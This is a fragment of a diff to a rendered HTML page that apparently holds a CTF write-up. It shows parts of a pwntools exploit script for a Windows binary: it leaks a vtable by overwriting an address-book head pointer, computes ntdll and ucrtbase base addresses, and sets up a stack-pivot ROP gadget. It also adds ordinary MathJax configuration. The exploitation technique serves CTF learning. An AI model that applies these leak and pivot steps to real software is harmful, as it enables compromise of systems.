+<span class="hljs-comment"># overwrite addressbook-&gt;head to recyclebin, get recyclebin&apos;s vtable</span>
 <span class="hljs-comment"># not reliable leak, but address not changed before reboot</span>
 context.log_level = <span class="hljs-string">&quot;debug&quot;</span>
 
@@ -460,7 +460,7 @@ ucrtbase = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-stri
 print(<span class="hljs-string">&quot;image base : &quot;</span>+hex(imagebase))
 print(<span class="hljs-string">&quot;ntdll base : &quot;</span>+hex(ntdll))
 print(<span class="hljs-string">&quot;ucrtbase base : &quot;</span>+hex(ucrtbase))
-p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>)
+p.recvuntil(<span class="hljs-string">&apos;&gt;&apos;</span>)
 
 pivot = ntdll + <span class="hljs-number">0xA0E24</span> <span class="hljs-comment"># mov rsp, [rcx+152]; mov rcx, [rcx+248]; jmp rcx;</span>
 ret = ntdll + <span class="hljs-number">0x144F</span>
@@ -840,6 +840,45 @@ print(p.recv())</code></pre>
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
